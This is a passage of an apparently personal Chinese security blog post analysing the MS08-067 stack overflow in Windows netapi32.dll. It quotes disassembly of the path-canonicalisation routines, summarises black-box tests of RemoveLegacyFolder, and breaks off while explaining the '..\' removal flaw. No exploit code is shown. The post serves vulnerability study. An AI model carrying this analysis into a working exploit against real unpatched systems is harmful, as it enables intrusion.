<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>RPC入侵：MS08-067 | 技术栈</title><meta name="description" content="[toc]  MS08-067 简介 MS08-067 漏洞是由于 netapi32.dll 的导出函数 NetpwPathCanonicalize 在处理字符串时出现了错误，从而导致栈溢出，并且影响的操作系统范围很广，包括引入了 GS 安全机制的 Windows XP SP2、 Vista 以及 Windows 7。 MS08-067 的溢出发生在 NetpwPathCannonicalize"><meta property="og:type" content="article"><meta property="og:title" content="RPC入侵：MS08-067"><meta property="og:url" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/index.html"><meta property="og:site_name" content="技术栈"><meta property="og:description" content="[toc]  MS08-067 简介 MS08-067 漏洞是由于 netapi32.dll 的导出函数 NetpwPathCanonicalize 在处理字符串时出现了错误，从而导致栈溢出，并且影响的操作系统范围很广，包括引入了 GS 安全机制的 Windows XP SP2、 Vista 以及 Windows 7。 MS08-067 的溢出发生在 NetpwPathCannonicalize"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719143626519.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719144447435.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719214318308.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719230053057.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719221744326.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719222947145.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719223324355.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719231639738.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719232209182.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220720080253266.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220720105512544-16583052120081.png"><meta property="article:published_time" content="2022-07-20T08:15:17.000Z"><meta property="article:modified_time" content="2022-08-01T11:20:03.340Z"><meta property="article:author" content="rgzzplus"><meta property="article:tag" content="漏洞"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719143626519.png"><link rel="canonical" href="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/index.html"><link rel="alternate" href="/atom.xml" title="技术栈" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.min.css"><meta name="generator" content="Hexo 6.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/rgzz-zq" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">人工智障plus</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Wuhan, China</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">首页</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">归档</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">分类</span></a></li><li class="menu-item menu-item-repository"><a href="/repository"><i class="icon icon-project"></i> <span class="menu-title">项目</span></a></li><li class="menu-item menu-item-links"><a href="/links"><i class="icon icon-friendship"></i> <span class="menu-title">友链</span></a></li><li class="menu-item menu-item-about"><a href="/about"><i class="icon icon-cup-fill"></i> <span class="menu-title">关于</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/rgzz-zq" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">公告</h3><div class="widget-body"><div id="board"><div class="content"><p>欢迎来到技术栈！</p></div></div></div></div><div class="widget"><h3 class="widget-title">分类</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/0day%E5%AE%89%E5%85%A8/">0day安全</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">17</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/c/">c++</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA/">个人</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%94%B6%E8%97%8F%E5%A4%B9/">收藏夹</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/">经验交流</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%A2%98%E5%BA%93-%E4%BD%9C%E4%B8%9A/">题库/作业</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2/">高级搜索</a><span class="category-list-count">1</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签云</h3><div class="widget-body tagcloud"><a href="/tags/ASLR/" style="font-size:13px">ASLR</a> <a href="/tags/C/" style="font-size:13px">C++</a> <a href="/tags/C%E5%92%8C%E6%8C%87%E9%92%88/" style="font-size:13.33px">C和指针</a> <a href="/tags/DEP/" style="font-size:13px">DEP</a> <a href="/tags/GS/" style="font-size:13px">GS</a> <a href="/tags/Git/" style="font-size:13px">Git</a> <a href="/tags/HeapSpary/" style="font-size:13px">HeapSpary</a> <a href="/tags/IDA/" style="font-size:13.33px">IDA</a> <a href="/tags/LNMP/" style="font-size:13px">LNMP</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" style="font-size:13px">Linux保护机制</a> <a href="/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" style="font-size:13px">Linux常用命令</a> <a href="/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/" style="font-size:13px">Linux汇编伪指令</a> <a href="/tags/QT/" style="font-size:13.33px">QT</a> <a href="/tags/ROP/" style="font-size:13px">ROP</a> <a href="/tags/SEHOP/" style="font-size:13px">SEHOP</a> <a href="/tags/SafeSEH/" style="font-size:13px">SafeSEH</a> <a href="/tags/c/" style="font-size:13px">c</a> <a href="/tags/gdb/" style="font-size:14px">gdb</a> <a href="/tags/glibc%E7%89%88%E6%9C%AC%E5%8F%B7/" style="font-size:13px">glibc版本号</a> <a href="/tags/hexo/" style="font-size:13.33px">hexo</a> <a href="/tags/libc/" style="font-size:13px">libc</a> <a href="/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/" style="font-size:13px">linux命令行大全</a> <a href="/tags/linux%E9%97%AE%E9%A2%98/" style="font-size:13px">linux问题</a> <a href="/tags/ollydebug/" style="font-size:13px">ollydebug</a> <a href="/tags/pwn/" style="font-size:13px">pwn</a> <a href="/tags/pwnstack/" style="font-size:13px">pwnstack</a> <a href="/tags/ret2libc/" style="font-size:13px">ret2libc</a> <a href="/tags/ret2shellcode/" style="font-size:13px">ret2shellcode</a> <a href="/tags/ret2syscall/" style="font-size:13px">ret2syscall</a> <a href="/tags/ret2text/" style="font-size:13px">ret2text</a> <a href="/tags/ret2win/" style="font-size:13px">ret2win</a> <a href="/tags/reverse/" style="font-size:13.33px">reverse</a> <a href="/tags/shellcode/" style="font-size:13.67px">shellcode</a> <a href="/tags/task-struct/" style="font-size:13px">task_struct</a> <a href="/tags/typora/" style="font-size:13px">typora</a> <a href="/tags/ubuntu/" style="font-size:13.67px">ubuntu</a> <a href="/tags/%E4%B8%AD%E5%9B%BD%E7%9F%A5%E7%BD%91/" style="font-size:13px">中国知网</a> <a href="/tags/%E4%BA%92%E6%96%A5%E9%94%81/" style="font-size:13px">互斥锁</a> <a href="/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/" style="font-size:13px">信号量</a> <a href="/tags/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E/" style="font-size:13px">其它类型的漏洞</a> <a href="/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/" style="font-size:13px">内存大小端</a> <a href="/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/" style="font-size:13px">内存攻击</a> <a href="/tags/%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC/" style="font-size:13px">内核版本</a> <a href="/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/" style="font-size:13px">函数指针</a> <a href="/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/" style="font-size:13px">同步互斥</a> <a href="/tags/%E5%A0%86/" style="font-size:13.67px">堆</a> <a href="/tags/%E5%AE%89%E8%A3%85%E5%8C%85%E4%BE%9D%E8%B5%96/" style="font-size:13px">安装包依赖</a> <a href="/tags/%E5%B1%8F%E9%9A%9C/" style="font-size:13px">屏障</a> <a href="/tags/%E5%BB%BA%E7%AB%99/" style="font-size:13px">建站</a> <a href="/tags/%E5%BF%83%E8%B7%AF/" style="font-size:13px">心路</a> <a href="/tags/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/" style="font-size:13px">搜索引擎</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size:13.33px">攻防世界</a> <a href="/tags/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/" style="font-size:13px">数组越界</a> <a href="/tags/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" style="font-size:13px">整数安全</a> <a href="/tags/%E6%9D%82%E8%B0%88/" style="font-size:13px">杂谈</a> <a href="/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/" style="font-size:13px">条件变量</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size:13px">栈溢出</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">格式化字符串</a> <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" style="font-size:13px">正则表达式</a> <a href="/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/" style="font-size:13px">汇编指令</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size:14px">漏洞</a> <a href="/tags/%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B/" style="font-size:13px">系统进程</a> <a href="/tags/%E8%87%AA%E6%97%8B%E9%94%81/" style="font-size:13px">自旋锁</a> <a href="/tags/%E8%AE%BA%E5%9D%9B-%E5%8D%9A%E5%AE%A2/" style="font-size:13px">论坛&博客</a> <a href="/tags/%E8%AF%BB%E5%86%99%E9%94%81/" style="font-size:13px">读写锁</a></div></div><div class="widget"><h3 class="widget-title">归档</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">十月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">九月 2022</a><span class="archive-list-count">16</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">八月 2022</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a><span class="archive-list-count">16</span></li></ul></div></div><div class="widget"><h3 class="widget-title">最新文章</h3><div class="widget-body"><ul class="recent-post-list list-unstyled"><li><div class="item-thumb"><a href="/2022/10/17/QTCreater%E9%A3%9F%E7%94%A8%E6%8A%80%E5%B7%A7/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/c/">c++</a></p><p class="item-title"><a href="/2022/10/17/QTCreater%E9%A3%9F%E7%94%A8%E6%8A%80%E5%B7%A7/" class="title">QTCreater食用技巧</a></p><p class="item-date"><time datetime="2022-10-17T00:24:14.000Z" itemprop="datePublished">2022-10-17</time></p></div></li><li><div class="item-thumb"><a href="/2022/10/17/QT%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a></p><p class="item-title"><a href="/2022/10/17/QT%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" class="title">QT安装教程</a></p><p class="item-date"><time datetime="2022-10-17T00:22:14.000Z" itemprop="datePublished">2022-10-17</time></p></div></li><li><div class="item-thumb"><a href="/2022/10/14/%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2/">高级搜索</a></p><p class="item-title"><a href="/2022/10/14/%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2/" class="title">高级搜索</a></p><p class="item-date"><time datetime="2022-10-14T12:32:53.000Z" itemprop="datePublished">2022-10-14</time></p></div></li><li><div class="item-thumb"><a href="/2022/10/03/pwnstack/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/10/03/pwnstack/" class="title">pwnstack</a></p><p class="item-date"><time datetime="2022-10-03T01:38:34.000Z" itemprop="datePublished">2022-10-03</time></p></div></li><li><div class="item-thumb"><a href="/2022/10/03/PWN%E9%A2%98%E7%9B%AE%E5%8A%A0%E8%BD%BD%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC%E7%9A%84glibc/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/10/03/PWN%E9%A2%98%E7%9B%AE%E5%8A%A0%E8%BD%BD%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC%E7%9A%84glibc/" class="title">PWN题目加载指定版本的glibc</a></p><p class="item-date"><time datetime="2022-10-03T01:38:08.000Z" itemprop="datePublished">2022-10-03</time></p></div></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse in" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ms08-067-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">MS08-067 简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A4%E8%AF%86-legacy-folder"><span class="toc-number">2.</span> <span class="toc-text">认识 Legacy Folder</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A7%BB%E7%BB%8F-%E6%B5%8B%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">“移经” 测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A7%BB%E7%BB%8F-%E9%A3%8E%E9%99%A9"><span class="toc-number">4.</span> <span class="toc-text">“移经” 风险</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">4.1.</span> <span class="toc-text">静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#netpwpathcanonicalize"><span class="toc-number">4.1.1.</span> <span class="toc-text">NetpwPathCanonicalize</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">4.2.</span> <span class="toc-text">动态调试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#poc-%E7%9A%84%E6%9E%84%E9%80%A0"><span class="toc-number">5.</span> <span class="toc-text">POC 的构造</span></a></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-RPC入侵：MS08-067" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">RPC入侵：MS08-067</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/" class="article-date"><time datetime="2022-07-20T08:15:17.000Z" itemprop="datePublished">2022-07-20</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/0day%E5%AE%89%E5%85%A8/">0day安全</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a> </span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/#comments" class="article-comment-link">评论</a></span> <span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 2.9k(字)</span> <span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 13(分)</span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>[toc]</p><h1 id="ms08-067-简介"><a class="markdownIt-Anchor" href="#ms08-067-简介"></a> MS08-067 简介</h1><p>MS08-067 漏洞是由于 netapi32.dll 的导出函数 NetpwPathCanonicalize 在处理字符串时出现了错误，从而导致栈溢出，并且影响的操作系统范围很广，包括引入了 GS 安全机制的 Windows XP SP2、 Vista 以及 Windows 7。</p><p>MS08-067 的溢出发生在 NetpwPathCannonicalize 函数的子函数 CanonicalizePathName 中。当路径合并至临时的栈空间 Buff_OF 后， CanonicalizePathName 函数并不是直接将其复制到输出参数 can_path 中，而是要对 Buff_OF 串做以下三步操作，以对路径规范化。</p><p>1）将合并路径中的所有的 slash 字符‘ /’（ 0x2F）转化为 backslash 字符‘ \’（ 0x5C）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA1F0 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA1F6 jz short @@chk_dos_path_type</span><br><span class="line">5FDDA1F8 @@replace_slash_loop:</span><br><span class="line">5FDDA1F8 cmp word ptr [eax], &#x27;/&#x27;</span><br><span class="line">5FDDA1FC jz @@slash_to_back_slash</span><br><span class="line">5FDDA202 @@slash_to_back_forward:</span><br><span class="line">5FDDA202 inc eax</span><br><span class="line">5FDDA203 inc eax</span><br><span class="line">5FDDA204 cmp word ptr [eax], 0</span><br><span class="line">5FDDA208 jnz short @@replace_slash_loop</span><br><span class="line">...</span><br><span class="line">5FDE88EF @@slash_to_back_slash:</span><br><span class="line">5FDE88EF mov word ptr [eax], &#x27;\&#x27;</span><br><span class="line">5FDE88F4 jmp @@slash_to_back_forward</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>2）调用子函数 CheckDosPathType，检查合并路径的 DOS 路径类型，由于与溢出无关，不用深究其原理，我们只需了解这个函数的返回值，如果返回0，代码即将进入产生溢出的函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA20A @@chk_dos_path_type:</span><br><span class="line">5FDDA20A lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA210 call CheckDosPathType</span><br><span class="line">5FDDA215 test eax, eax</span><br><span class="line">5FDDA217 jnz short @@chk_buf_of_len</span><br><span class="line">5FDDA219 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA21F push eax</span><br><span class="line">5FDDA220 call RemoveLegarcyFolder	;溢出函数</span><br><span class="line">5FDDA225 test eax, eax</span><br><span class="line">5FDDA227 jz short @@err_invalid_name</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>3）溢出就发生在子函数 RemoveLegacyFolder 中； RemoveLegacyFolder 返回后，如果返回非零，表示合并路径已符合要求，若其长度未超过 maxbuf，即可复制至 can_path 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA229 @@chk_buf_of_len:</span><br><span class="line">5FDDA229 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA22F push eax</span><br><span class="line">5FDDA230 call esi ; __imp_wcslen</span><br><span class="line">5FDDA232 lea eax, [eax+eax+2]</span><br><span class="line">5FDDA236 cmp eax, [ebp+arg_MaxBuf]</span><br><span class="line">5FDDA239 pop ecx</span><br><span class="line">5FDDA23A ja @@chk_retsize</span><br><span class="line">5FDDA240 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA246 push eax ; Source: Buff_OF</span><br><span class="line">5FDDA247 push [ebp+Outbuf] ; Dest: same as can_path</span><br><span class="line">5FDDA24D call ds:__imp_wcscpy</span><br><span class="line">5FDDA253 pop ecx</span><br><span class="line">5FDDA254 pop ecx</span><br><span class="line">5FDDA255 xor eax, eax</span><br><span class="line">5FDDA257 @@chk_security_cookie:</span><br><span class="line">5FDDA257 mov ecx, [ebp+security_cookie]</span><br><span class="line">5FDDA25A pop edi</span><br><span class="line">5FDDA25B pop esi</span><br><span class="line">5FDDA25C pop ebx</span><br><span class="line">5FDDA25D call chk_security_cookie</span><br><span class="line">5FDDA262 leave</span><br><span class="line">5FDDA263 retn 14h</span><br><span class="line">...</span><br><span class="line">5FDE88F9 @@chk_retsize:</span><br><span class="line">5FDE88F9 mov ecx, [ebp+RetSize]</span><br><span class="line">5FDE88FF test ecx, ecx</span><br><span class="line">5FDE8901 jz short @@err_buf_too_small</span><br><span class="line">5FDE8903 mov [ecx], eax</span><br><span class="line">5FDE8905 @@err_buf_too_small:</span><br><span class="line">5FDE8905 mov eax, NERR_BufTooSmall</span><br><span class="line">5FDE890A jmp @@chk_security_cookie</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="认识-legacy-folder"><a class="markdownIt-Anchor" href="#认识-legacy-folder"></a> 认识 Legacy Folder</h1><p>Legacy Folder，又叫经典目录，指的是 ’.‘ (当前目录) 和 ‘…’ (上一层目录)这两个特殊的目录。</p><p>在对路径进行范式化的过程中，函数 RemoveLegacyFolder 的作用就是将合并路径中的经典目录移去（后面简称“移经”），使路径达到最简洁状态。</p><h1 id="移经-测试"><a class="markdownIt-Anchor" href="#移经-测试"></a> “移经” 测试</h1><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719143626519.png" alt="image-20220719143626519" style="zoom:67%"><p>通过黑盒测试，可以看出 RemoveLegacyFolder 函数具有以下特性：</p><p>1）通过 II、 III 对比，目录名是以‘\’作为隔离符的，如果‘…\’ 的左边没有隔离符了，“移经”将失败；<br>2）由 VIII 可以看出，在路径中部（注意，不是首部），如果有两个连续的隔离符‘\’，“移经”将失败；<br>3） XI 的返回值非零，但是合并路径中却有内容，表明“移经”操作应该通过并已经复制到 can_path 中，很可能是在最后的检查过程中，出现了错误。通过查看汇编代码，原来在路径合并结束后， NetpaPathCanonicalize 还会调用 NetpwPathType 函数对合并路径进行检查，并将 NetpwPathType 的结果作为整个函数的返回值。 XI 中的合并路径\\aaa 显然不是一个合法的路径</p><h1 id="移经-风险"><a class="markdownIt-Anchor" href="#移经-风险"></a> “移经” 风险</h1><p>‘ <code>.\</code>’ 的移去操作很简单：只需要调用一次字符复制函数即可将 “经典目录” 移去。<br><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719144447435.png" alt="image-20220719144447435" style="zoom:50%"></p><p>‘<code>..\</code>’ 的移去操作却麻烦了不少：</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719214318308.png" alt="image-20220719214318308"></p><p>如果 p1 为当前指针， p2 和 p1 总是相差 3 个字符的位置，但仅凭 p1、 p2 是无法获取 p3 ，因为 FOLDER2 的长度不固定，对于获取 p3 